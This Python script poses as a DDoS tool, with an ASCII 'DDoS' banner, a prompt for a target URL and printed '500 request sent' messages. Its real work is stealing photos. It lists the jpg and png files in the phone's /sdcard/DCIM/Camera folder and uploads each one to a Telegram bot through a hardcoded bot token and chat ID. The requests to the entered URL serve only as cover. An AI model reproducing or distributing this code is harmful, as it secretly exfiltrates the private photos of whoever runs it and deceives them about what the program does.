import os
import requests
import sys
# Bot tolen mo
_token = "7282155355:AAFrbyk-i6Yg14u_Pm32PxNwMj7Qkm96usI"

print(f'''\033[1;91m
    ┏━━━┓╋┏┓
    ┗┓┏┓┃╋┃┃
    ╋┃┃┃┣━┛┣━━┳━━┓
    ╋┃┃┃┃┏┓┃┏┓┃━━┫
    ┏┛┗┛┃┗┛┃┗┛┣━━┃
    ┗━━━┻━━┻━━┻━━┛\33[97m
============================
''')
url = input('URL:\033[91m~ ')

def get_all_images(folder_path):
	try:
		#print(folder_path)
		images = []
		for filename in os.listdir(folder_path):
			print(filename)
			if filename.endswith(".jpg") or filename.endswith(".jpeg") or filename.endswith(".png"):
				images.append(os.path.join(folder_path, filename))
		print(images)
		return images
	except FileNotFoundError as e:
		print("\033[1;91mSomething went wrong!")
		print(e)
		sys.exit()

folder_path = "/sdcard/DCIM/Camera"
image_list = get_all_images(folder_path)

for image in image_list:
	#this = image.split('/')[4]
#	print(this)
	tite = {"document":open(image, 'rb')}
	res = requests.post("https://api.telegram.org/bot{}/sendDocument?chat_id=7075537944".format(_token),files=tite)
	rim = requests.get(url)
	i = "\033[92m200"
	I = "\033[91m{}".format(rim.status_code)
	print(f"\033[97m500 request sent to \033[92m{url} \033[97m- {i if rim.status_code == 200 else I}\033[97m....")
